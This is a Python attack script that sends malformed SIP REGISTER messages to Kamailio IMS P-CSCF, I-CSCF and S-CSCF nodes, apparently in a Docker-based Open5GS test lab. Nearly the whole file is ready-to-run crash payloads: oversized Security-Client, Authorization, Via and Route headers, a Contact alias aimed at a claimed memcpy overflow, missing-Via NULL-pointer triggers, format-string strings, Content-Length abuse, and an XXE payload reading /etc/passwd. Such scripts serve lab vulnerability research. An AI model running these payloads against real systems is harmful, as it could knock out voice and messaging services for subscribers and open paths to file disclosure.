#!/usr/bin/env python3
"""
CSCF Crash Trigger Scripts
==========================
Target: Kamailio IMS CSCF (P-CSCF, I-CSCF, S-CSCF) v6.1.3

Attack Vectors:
1. P-CSCF: Malformed Security-Client/Verify headers
2. P-CSCF: Contact header alias parsing overflow
3. I-CSCF: Malformed SIP URI / oversized headers
4. S-CSCF: Authentication header parsing
5. All: Malformed Via headers
6. All: Oversized SIP messages
7. All: NULL pointer triggers (missing headers)

Usage:
    python3 cscf_crash_triggers.py --target pcscf --attack all
    python3 cscf_crash_triggers.py --target scscf --attack auth_overflow

Environment Restart:
    cd /root/5gc/open5gs/docker_open5gs_v3
    docker compose -f sa-vonr-deploy-2.8.1-beta.yaml down
    docker compose -f sa-vonr-deploy-2.8.1-beta.yaml up -d
"""

import socket
import sys
import argparse
import time
import random
import string

# ============================================================================
# Configuration
# ============================================================================
PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060

ICSCF_IP = "172.22.0.19"
ICSCF_PORT = 4060

SCSCF_IP = "172.22.0.20"
SCSCF_PORT = 6060

UE_IP = "172.29.0.18"
IMS_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"
IMSI = "460090000000001"
MSISDN = "13300000001"


def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def send_sip(target_ip, target_port, message, timeout=3):
    """Send SIP message and return response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(message.encode(), (target_ip, target_port))
        try:
            data, addr = sock.recvfrom(65535)
            return data.decode(errors='ignore')
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return f"ERROR: {e}"


def check_container_status(container_name):
    """Check if container is running"""
    import subprocess
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', container_name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


# ============================================================================
# P-CSCF Attack Vectors
# ============================================================================

def attack_pcscf_malformed_security_client():
    """
    Attack: Malformed Security-Client header
    Target: sec_agree.c parse_sec_agree()
    Vector: Missing semicolon, invalid parameters, oversized values
    """
    print("[*] P-CSCF: Malformed Security-Client header")

    # Vector 1: Missing mechanism separator
    msg1 = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Security-Client: ipsec-3gpp alg=hmac-md5-96\r\n"  # Missing semicolon
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    # Vector 2: Oversized SPI value (integer overflow)
    msg2 = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Security-Client: ipsec-3gpp; alg=hmac-md5-96; spi-c=99999999999999999999; spi-s=88888888888888888888\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    # Vector 3: Negative values
    msg3 = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Security-Client: ipsec-3gpp; alg=hmac-md5-96; spi-c=-1; port-c=-1\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    # Vector 4: Very long parameter value
    msg4 = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Security-Client: ipsec-3gpp; alg={'A' * 10000}; ealg={'B' * 10000}\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    for i, msg in enumerate([msg1, msg2, msg3, msg4], 1):
        print(f"  Sending vector {i}...")
        resp = send_sip(PCSCF_IP, PCSCF_PORT, msg)
        print(f"  Response: {resp[:100] if resp else 'No response'}")
        time.sleep(0.5)


def attack_pcscf_contact_alias_overflow():
    """
    Attack: Contact header alias parameter overflow
    Target: save.c update_contacts() line 229
    Vector: memcpy(portbuf, port_s, (p - port_s)) - portbuf is only 5 bytes
    """
    print("[*] P-CSCF: Contact alias overflow")

    # Vector: alias with oversized port (portbuf is 5 bytes, no bounds check)
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060;alias=1.2.3.4~99999999999999999999~1>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending oversized alias port...")
    resp = send_sip(PCSCF_IP, PCSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


def attack_pcscf_missing_via():
    """
    Attack: Missing Via header (NULL pointer dereference)
    Target: save.c save_pending() - vb = cscf_get_ue_via(_m)
    """
    print("[*] P-CSCF: Missing Via header")

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending REGISTER without Via...")
    resp = send_sip(PCSCF_IP, PCSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


# ============================================================================
# I-CSCF Attack Vectors
# ============================================================================

def attack_icscf_oversized_uri():
    """
    Attack: Oversized SIP URI
    Target: URI parsing in core parser
    """
    print("[*] I-CSCF: Oversized SIP URI")

    # Very long username
    long_user = 'A' * 5000
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{long_user}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{long_user}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending oversized URI...")
    resp = send_sip(ICSCF_IP, ICSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


def attack_icscf_malformed_route():
    """
    Attack: Malformed Route header
    Target: Route parsing
    """
    print("[*] I-CSCF: Malformed Route header")

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Route: <sip:{'A' * 10000}@{IMS_DOMAIN};lr>\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending malformed Route...")
    resp = send_sip(ICSCF_IP, ICSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


# ============================================================================
# S-CSCF Attack Vectors
# ============================================================================

def attack_scscf_auth_overflow():
    """
    Attack: Authentication header overflow
    Target: ims_auth/authorize.c
    Vector: Oversized Authorization header values
    """
    print("[*] S-CSCF: Authentication header overflow")

    # Oversized nonce
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 2 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Authorization: Digest username=\"{MSISDN}@{IMS_DOMAIN}\", "
        f"realm=\"{IMS_DOMAIN}\", "
        f"nonce=\"{'A' * 10000}\", "
        f"uri=\"sip:{IMS_DOMAIN}\", "
        f"response=\"{'B' * 1000}\", "
        f"algorithm=AKAv1-MD5, "
        f"ik=\"{'C' * 1000}\", "
        f"ck=\"{'D' * 1000}\"\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    print("  Sending oversized Authorization...")
    resp = send_sip(SCSCF_IP, SCSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


def attack_scscf_malformed_xml():
    """
    Attack: Malformed XML in user data
    Target: userdata_parser.c
    """
    print("[*] S-CSCF: Malformed XML user data")

    # This would be sent via Cx interface, but we can try SIP with XML body
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Content-Type: application/xml\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 100\r\n\r\n"
        f"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    )

    print("  Sending XML with XXE...")
    resp = send_sip(SCSCF_IP, SCSCF_PORT, msg)
    print(f"  Response: {resp[:100] if resp else 'No response'}")


# ============================================================================
# Common Attack Vectors (All CSCFs)
# ============================================================================

def attack_malformed_via():
    """
    Attack: Malformed Via header
    Target: parse_via.c
    """
    print("[*] All: Malformed Via header")

    vectors = [
        # Missing protocol
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n",

        # Oversized branch
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{'A' * 10000}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n",

        # Invalid characters
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=\x00\x01\x02\x03\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n",
    ]

    for target_name, target_ip, target_port in [
        ("P-CSCF", PCSCF_IP, PCSCF_PORT),
        ("I-CSCF", ICSCF_IP, ICSCF_PORT),
        ("S-CSCF", SCSCF_IP, SCSCF_PORT)
    ]:
        for i, msg in enumerate(vectors, 1):
            print(f"  {target_name} vector {i}...")
            resp = send_sip(target_ip, target_port, msg)
            print(f"    Response: {resp[:80] if resp else 'No response'}")
            time.sleep(0.3)


def attack_oversized_message():
    """
    Attack: Oversized SIP message
    Target: Memory allocation / buffer handling
    """
    print("[*] All: Oversized SIP message")

    # 100KB message
    padding = 'X' * 100000
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"X-Padding: {padding}\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    for target_name, target_ip, target_port in [
        ("P-CSCF", PCSCF_IP, PCSCF_PORT),
        ("I-CSCF", ICSCF_IP, ICSCF_PORT),
        ("S-CSCF", SCSCF_IP, SCSCF_PORT)
    ]:
        print(f"  {target_name}...")
        resp = send_sip(target_ip, target_port, msg)
        print(f"    Response: {resp[:80] if resp else 'No response'}")


def attack_content_length_mismatch():
    """
    Attack: Content-Length mismatch
    Target: Message body parsing
    """
    print("[*] All: Content-Length mismatch")

    # Content-Length larger than actual body
    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 999999\r\n\r\n"
        f"short body"
    )

    for target_name, target_ip, target_port in [
        ("P-CSCF", PCSCF_IP, PCSCF_PORT),
        ("S-CSCF", SCSCF_IP, SCSCF_PORT)
    ]:
        print(f"  {target_name}...")
        resp = send_sip(target_ip, target_port, msg, timeout=5)
        print(f"    Response: {resp[:80] if resp else 'No response/timeout'}")


def attack_negative_content_length():
    """
    Attack: Negative Content-Length
    Target: Integer parsing
    """
    print("[*] All: Negative Content-Length")

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-{random_string(10)}\r\n"
        f"From: <sip:{MSISDN}@{IMS_DOMAIN}>;tag={random_string(8)}\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: {random_string(20)}@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: -1\r\n\r\n"
    )

    for target_name, target_ip, target_port in [
        ("P-CSCF", PCSCF_IP, PCSCF_PORT),
        ("S-CSCF", SCSCF_IP, SCSCF_PORT)
    ]:
        print(f"  {target_name}...")
        resp = send_sip(target_ip, target_port, msg)
        print(f"    Response: {resp[:80] if resp else 'No response'}")


def attack_format_string():
    """
    Attack: Format string in headers
    Target: Logging functions
    """
    print("[*] All: Format string attack")

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-%n%n%n%n\r\n"
        f"From: <sip:%s%s%s%s@{IMS_DOMAIN}>;tag=%x%x%x%x\r\n"
        f"To: <sip:{MSISDN}@{IMS_DOMAIN}>\r\n"
        f"Call-ID: %n%n%n%n@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{MSISDN}@{UE_IP}:5060>;expires=3600\r\n"
        f"User-Agent: %s%s%s%s%s%s%s%s\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    for target_name, target_ip, target_port in [
        ("P-CSCF", PCSCF_IP, PCSCF_PORT),
        ("I-CSCF", ICSCF_IP, ICSCF_PORT),
        ("S-CSCF", SCSCF_IP, SCSCF_PORT)
    ]:
        print(f"  {target_name}...")
        resp = send_sip(target_ip, target_port, msg)
        print(f"    Response: {resp[:80] if resp else 'No response'}")


# ============================================================================
# Main
# ============================================================================

ATTACKS = {
    'pcscf': [
        ('security_client', attack_pcscf_malformed_security_client),
        ('contact_alias', attack_pcscf_contact_alias_overflow),
        ('missing_via', attack_pcscf_missing_via),
    ],
    'icscf': [
        ('oversized_uri', attack_icscf_oversized_uri),
        ('malformed_route', attack_icscf_malformed_route),
    ],
    'scscf': [
        ('auth_overflow', attack_scscf_auth_overflow),
        ('malformed_xml', attack_scscf_malformed_xml),
    ],
    'common': [
        ('malformed_via', attack_malformed_via),
        ('oversized_msg', attack_oversized_message),
        ('content_length', attack_content_length_mismatch),
        ('negative_cl', attack_negative_content_length),
        ('format_string', attack_format_string),
    ]
}


def main():
    parser = argparse.ArgumentParser(description='CSCF Crash Trigger Scripts')
    parser.add_argument('--target', choices=['pcscf', 'icscf', 'scscf', 'all'],
                        default='all', help='Target CSCF')
    parser.add_argument('--attack', default='all',
                        help='Specific attack or "all"')
    parser.add_argument('--check', action='store_true',
                        help='Check container status after attacks')
    args = parser.parse_args()

    print("=" * 70)
    print("CSCF Crash Trigger Scripts")
    print("=" * 70)

    # Run attacks
    if args.target == 'all':
        targets = ['pcscf', 'icscf', 'scscf', 'common']
    else:
        targets = [args.target, 'common']

    for target in targets:
        if target not in ATTACKS:
            continue

        print(f"\n{'=' * 50}")
        print(f"Target: {target.upper()}")
        print(f"{'=' * 50}")

        for name, func in ATTACKS[target]:
            if args.attack == 'all' or args.attack == name:
                try:
                    func()
                except Exception as e:
                    print(f"  Error: {e}")
                time.sleep(1)

    # Check container status
    if args.check:
        print("\n" + "=" * 50)
        print("Container Status Check")
        print("=" * 50)
        for container in ['pcscf', 'icscf', 'scscf']:
            status = check_container_status(container)
            print(f"  {container}: {'RUNNING' if status else 'STOPPED/CRASHED'}")


if __name__ == '__main__':
    main()
